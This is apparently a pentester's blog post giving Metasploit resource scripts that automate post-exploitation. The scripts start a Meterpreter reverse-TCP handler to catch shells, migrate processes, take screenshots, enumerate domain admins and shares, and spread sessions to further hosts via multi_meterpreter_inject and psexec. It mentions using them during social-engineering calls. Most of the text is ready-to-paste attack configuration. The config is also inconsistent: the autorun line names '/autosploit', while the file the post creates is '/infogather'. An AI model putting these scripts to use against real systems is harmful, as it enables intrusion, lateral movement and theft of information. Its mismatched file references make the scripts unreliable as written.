---
layout: post
title: Hit the Ground Running- Automating Metasploit
summary: Use resource scripts to run common Metasploit tasks quickly
tags:
- metasploit
---
     
There are a number of commands that tend to get run on every session on a target I get in Metasploit. Using resource files, these commands can be automated to dump as much information as possible, as quickly as possible. This can be combined with an MSFConsole autostart script to automate the starting of handlers and pre-fill options for post modules that don't need to be run on every session.

First we make a new file for the autorunscript to be run on each new session:
`nano /infogather`
     
and paste the following in the file:

```plaintext
run migrate -f
screenshot -v false
ps
ipconfig
sysinfo
run post/windows/gather/enum_shares
run post/windows/gather/enum_domain_group_users  group="Domain Admins"
run post/windows/gather/checkvm
screenshot -v false
background
```
     
Each command will be run sequentially and then background the session. Any command that can be run through a meterpreter shell can be used, with options added (for example, screenshot using the -v false option). Running the above commands will save screenshots to the default directory, `/root/*RANDOMNAME*.jpeg` and will save the output from the other gather post modules to the `/root/.msf4/loot` directory.

It should be noted that running a large number of commands could cause sessions to drop. If you find that being the case, try removing some of the commands you don’t need output from on every session. Alternatively, this could be run up as a resource file by calling it with:
     
`resource /infogather`

Now we're all set to catch some shells. Let's make that easier by having a handler autostart, get logging all set up, and get the `post/windows/manage/multi_meterpreter_inject module` ready to spread our session to some other machines for posterity.
     
     
Let's create the `/root/.msf4/msfconsole.rc` file that MSFConsole will automatically run with 

`nano /root/.msf4/msfconsole.rc`
     
and paste the following in the file:

```plaintext
spool /mylog.log
set consolelogging true
set loglevel 5
set sessionlogging true
set timestampoutput true
set prompt %T S:%S J:%J
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost X.X.X.X
set lport YYY
set exitonsession false
set enablestageencoding true
set autorunscript multi_console_command.rb -rc /autosploit
exploit -j -z
use post/windows/manage/multi_meterpreter_inject
set iplist X.X.X.X;X.X.X.X
set lport YYY
jobs
```
     
Similar to the autosploit resource file, any command normally entered into the msf prompt can be used-- enabling you to set up any post module you want. Don't forget to replace the Xs above with the proper IP data. If you're using the `multi_meterpreter_inject`, you can add multiple addresses in a semicolon-separated list to spread the meterpreter session to numerous boxes for penetration.

Finally, we’ll create a resource file to kill and restart a listener-- good for when you’re on a social engineering call and the just isn’t quite coming in. 

`nano /bounce`
     
then paste the following into the file:

```plaintext
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost X.X.X.X
set lport YYY
set exitonsession false
set enablestageencoding true
set autorunscript migrate -f
jobs -K
exploit -j -z
use exploit/windows/smb/psexec
```
     
Now we can call the resource file with the following command from the msf prompt:

`resource /bounce`
  